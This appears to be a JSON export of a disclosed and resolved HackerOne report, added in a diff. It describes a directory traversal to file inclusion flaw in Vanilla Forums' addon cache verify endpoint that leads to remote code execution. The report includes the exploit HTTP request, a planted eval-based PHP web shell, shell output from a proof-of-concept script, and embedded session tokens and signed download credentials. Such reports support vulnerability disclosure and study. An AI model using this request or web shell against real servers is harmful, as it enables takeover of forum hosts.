@@ -1,0 +1,166 @@
+{
+  "id": 411140,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTExNDA=",
+  "url": "https://hackerone.com/reports/411140",
+  "title": "Vanilla Forums AddonManager getSingleIndex Directory Traversal File Inclusion Remote Code Execution Vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-18T17:35:19.269Z",
+  "submitted_at": "2018-09-18T17:35:19.269Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mr_me",
+    "url": "/mr_me",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-03-13T12:22:14.862Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-02-11T12:22:13.655Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAn authenticated admin user can trigger a directory traversal to require call leading to local file inclusion which can allow an attacker to gain remote code execution.\n\n## Notes:\n\n- You need to have an admin session to run this poc.\n- You can use the directory traversal to reach outside of the web root\n- Even though this poc uses the unserialize bug, please note, the underlying root cause is the directory traversal and no check is made on `$type`.\n- Don't forget to cleanup the `-index.php` file in the conf directory\n- I had to adjust the pop chain slightly and add double digits to the number of properties for the Gdn_ConfigurationSource class otherwise the application will not parse the serialized payload properly. I'm not sure why, haven't bothered to investigate it since I found an easy work around.\n\n## Analysis:\n\nInside of the applications/dashboard/controllers/class.addoncachecontroller.php file, we can see there is a reachable function `verify()` which accepts a type parameter.\n\n```\n    /**\n     * Verify the addon cache is current.\n     *\n     * @param string $type\n     * @throws Exception if no type specified.\n     */\n    public function verify($type) {\n        $this->permission('Garden.Settings.Manage');\n\n        if ($type === null) {\n            throw new Exception('Type required');\n        }\n\n        $cached = Gdn::addonManager()->lookupAllByType($type);              // 1\n        $current = Gdn::addonManager()->scan($type);\n\n        $new = array_keys(array_diff_key($current, $cached));\n        $invalid = array_keys(array_diff_key($cached, $current));\n\n        $updateRequired = (count($new) || count($invalid));\n```\n\nAt [1] we can reach the call to `lookupAllByType()` on the addonManager class with an attacker controlled type.\n\n```\nclass AddonManager {\n\n    ...\n\n    private function typeUsesMultiCaching($type) {\n        return $type === Addon::TYPE_ADDON;\n    }\n\n    ...\n\n    /**\n     * Get all of the addons of a certain type.\n     *\n     * @param string $type One of the **Addon::TYPE_*** constants.\n     * @return array Return an array of addon indexed by their keys.\n     */\n    public function lookupAllByType($type) {                                                                // 2\n        if ($this->typeUsesMultiCaching($type)) {                                                           // 3\n            $this->ensureMultiCache();\n            return $this->multiCache;\n        } else {\n            $index = $this->getSingleIndex($type);                                                          // 4\n            $addons = [];\n            foreach ($index as $addonDirName => $addonDirPath) {\n                try {\n                    $addon = $this->lookupSingleCachedAddon($addonDirName, $type);\n                    $addons[$addon->getKey()] = $addon;\n                } catch (\\Exception $ex) {\n                    trigger_error(\"The $type in $subdir is invalid and will be skipped.\", E_USER_WARNING);\n                    // Clear the addon out of the index.\n                    $this->deleteSingleIndexKey($type, $addonDirName);\n                }\n            }\n            return $addons;\n        }\n    }\n\n    ...\n\n    /**\n     * Get the index for an addon type that is cached by single addon.\n     *\n     * @param string $type One of the **Addon::TYPE_*** constants.\n     * @return array Returns the index mapping [addonDirName => addonDirPath]\n     */\n    private function getSingleIndex($type) {                                                                // 5\n        if (!isset($this->singleIndex[$type])) {\n            $cachePath = \"$type-index.php\";                                                                 // 6\n\n            if ($this->isCacheEnabled() && is_readable(\"$this->cacheDir/$cachePath\")) {                     // 7\n                $this->singleIndex[$type] = require \"$this->cacheDir/$cachePath\";                           // 8\n            } else {\n                $addonDirs = $this->scanAddonDirs($type);\n\n                $this->saveArrayCache($cachePath, $addonDirs);\n\n                $this->singleIndex[$type] = $addonDirs;\n            }\n        }\n        return $this->singleIndex[$type];\n    }\n```\n\nAt [2] we enter the function and at [3] we don't enter the first code block as type is != to Addon::TYPE_ADDON. Then at [4] we call `getSingleIndex()` using our controlled type. Then at [5] we enter the function, at [6] we set the `$cachePath` variable which is pre-pended with the attackers string. Then at [7] we land in a check if the file path is readable, and if it is, we trigger a file inclusion using require.\n\nNote that there is no protection here for traversals and as such, a remote, context dependent attacker can leverage this for rce. However, this bug requires that an attacker has the following primitive:\n\n- They can upload a file in any directory with the name \"*-index.php\" containing some PHP code.\n\nWhilst this sounds rare, actually, it's very possible to do this on most applications. Since Vanilla doesn't allow this by default, I have marked this bug as a medium (not high), but you should be extra careful regarding inclusion functions.\n\n## Exploitation:\n\nAs stated above, we need a write primitive to write an *-index.php file somewhere on the filesystem with our code. So I leveraged the unserialize() vulnerability from a previous report to get that primitive.\n\nThen, I used the file inclusion and traversed a single directory into the conf directory. Note the traversals here, thats the underlying issue\n\n```\nPOST /index.php?p=/dashboard/addoncache/verify/..%252fconf%252f HTTP/1.1\nHost: 172.16.175.143\nCookie: Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U\nConnection: close\nContent-Type: application/x-www-form-urlencoded;\nContent-Length: 61\n\nc=system('id');die();\n```\n\nresponse from the webserver looks like this:\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 18 Sep 2018 14:59:01 GMT\nServer: Apache/2.4.29 (Ubuntu)\nSet-Cookie: Vanilla-tk=gLApzQGeSNA2zPpI%3A2%3A1537282741%3A0e76e0b87aee826b7a810b37c505b34e; path=/; HttpOnly\nP3P: CP=\"CAO PSA OUR\"\nContent-Length: 54\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nOf course, as always, I provided a fully functional exploit. The interesting part about this exploit is that I do not need to repair the constants.php file since we a writing a whole new file (which means I don't damage the system).\n\nThe clean up is removing the written file:\n\n```\nsteven@pluto:/var/www/html$ cat conf/-index.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_POST[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-18 14:43:21steven@pluto:/var/www/html$\n```\n\n## Example:\n\n```\nsaturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U\n(+) targeting: http://172.16.175.143\n(+) created a shell at conf/-index.php!\n(+) we can only reach it with the file inclusion!\n(+) dropping to a fake shell!\nwww-data@pluto:/var/www/html$ id;uname -a\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux pluto 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nwww-data@pluto:/var/www/html$ exit\n\nsaturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$\n```\n\n## Impact\n\nA context dependent attacker can achieve remote code execution.",
+  "bounty_amount": "900.0",
+  "formatted_bounty": "$900",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 347841,
+      "file_name": "vanilla_forums_addoncache_verify_lfi_rce.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/841/97353cd1aed2176d8cfb63f9846da41a1b8750c9/vanilla_forums_addoncache_verify_lfi_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_addoncache_verify_lfi_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_addoncache_verify_lfi_rce.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131118Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f0a9bcd457596c660923915f0b3e085cf950f74d07305d1aa724868242d7c7f",
+      "file_size": 108135,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-03-13T12:22:13.716Z",
+  "allow_singular_disclosure_after": -155350144.4493933,
+  "singular_disclosure_allowed": true,
+  "vote_count": 84,
+  "voters": [
+    "jensec",
+    "fqdn",
+    "stealthy",
+    "sameerphad72",
+    "bl4de",
+    "fvd",
+    "ali",
+    "s_p_q_r",
+    "dhakal_ananda",
+    "savitar0x01",
+    "and 74 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10603,
+      "category": "researcher",
+      "content": "An authenticated admin user can trigger a directory traversal to a `require` call leading to local file inclusion which can allow an attacker to gain remote code execution.",
+      "user": {
+        "id": 41443,
+        "username": "mr_me",
+        "name": "Steven Seeley",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://srcincite.io/",
+        "location": "",
+        "created_at": "2015-10-08T18:38:12.546Z",
+        "url": "https://hackerone.com/mr_me",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
